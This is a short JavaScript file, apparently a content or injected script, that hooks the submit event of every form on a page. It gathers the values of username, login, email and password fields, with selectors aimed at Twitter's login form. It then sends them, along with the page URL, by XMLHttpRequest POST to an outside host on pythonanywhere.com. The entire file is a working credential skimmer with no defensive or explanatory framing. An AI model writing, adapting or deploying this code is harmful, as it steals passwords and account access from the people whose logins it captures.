//get every form
var inputs = document.querySelectorAll("input[type=password]");
var forms = document.forms

//called when a submit event happens
function formSubmit(event) {
    var username = 
    {
        Name : "TwitterUsername",
        List : document.querySelectorAll("input[type=text].text-input.email-input")
    }
    var login = 
    {
        Name : "Login",
        List : document.querySelectorAll("input[type=text]#login-email")
    }
    var email = 
    {
        Name : "Email",
        List : document.querySelectorAll("input[type=email]")
    }
    var password = 
    {
        Name : "Password",
        List : document.querySelectorAll("input[type=password]")
    }

    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://osy.pythonanywhere.com/blog/test_new');
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    var string = 'URL : ' + document.URL;
    string = addToResults(username, string);
    string = addToResults(email, string);
    string = addToResults(login, string);
    string = addToResults(password, string);
    console.log(string);
    xhr.send(string);
}

function addToResults(element, string)
{
    var addedString = ""
    for(var i=0; i<element.List.length; i++)
	{
        addedString = addedString + element.List[i].value;
    }
    if(addedString != "")
        string = string + " - " + element.Name + ": " + addedString
    return string;
}

// add an event listener to the submit event for every form in the page
for (index = 0; index < forms.length; ++index) {
    forms[index].addEventListener('submit', formSubmit);
}

for (index = 0; index < inputs.length; ++index) {
    inputs[index].addEventListener('submit', formSubmit);
}
